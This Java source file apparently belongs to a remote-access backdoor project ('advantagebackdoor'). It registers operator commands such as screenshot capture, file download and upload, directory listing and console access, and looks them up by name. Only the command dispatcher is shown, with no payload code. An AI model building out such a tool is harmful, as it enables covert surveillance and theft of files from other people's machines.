package me.faintcloudy.advantagebackdoor.server.command;

import java.util.ArrayList;
import java.util.List;

public class CommandController {
    private final List<ServerCommand> serverCommands = new ArrayList<>();
    public CommandController() {
        this.registerCommand(new ConsoleCommand());
        this.registerCommand(new CommandListCommand());
        this.registerCommand(new TargetCommand());
        this.registerCommand(new UserListCommand());
        this.registerCommand(new ScreenShotCommand());
        this.registerCommand(new OpenFileCommand());
        this.registerCommand(new DirCommand());
        this.registerCommand(new DownloadCommand());
        this.registerCommand(new SendFileCommand());
        this.registerCommand(new CommandShowDialog());
    }

    public void registerCommand(ServerCommand command) {
        serverCommands.add(command);
    }

    public List<ServerCommand> getServerCommands() {
        return serverCommands;
    }

    public boolean isCommand(String s)
    {
        for (ServerCommand serverCommand : serverCommands) {
            if (serverCommand.name.equalsIgnoreCase(s))
                return true;
        }

        return false;
    }

    public ServerCommand getCommand(String s)
    {
        for (ServerCommand serverCommand : serverCommands) {
            if (serverCommand.name.equalsIgnoreCase(s))
                return serverCommand;
        }
        return null;
    }

}
